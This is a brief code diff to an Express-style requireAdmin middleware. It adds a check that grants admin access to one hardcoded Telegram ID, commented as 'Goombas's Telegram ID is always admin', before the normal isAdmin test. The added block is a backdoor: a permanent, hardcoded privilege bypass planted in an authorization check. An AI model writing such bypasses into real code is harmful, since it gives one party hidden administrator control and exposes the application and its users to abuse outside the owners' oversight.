@@ -20,6 +20,11 @@ export async function requireAdmin(
       .where(eq(users.id, req.user!.id))
       .limit(1);
 
+    // Goombas's Telegram ID is always admin
+    if (user?.telegramId === "1689953605") {
+      return next();
+    }
+
     if (!user || !user.isAdmin) {
       return res.status(403).json({ error: "Admin access required" });
     }
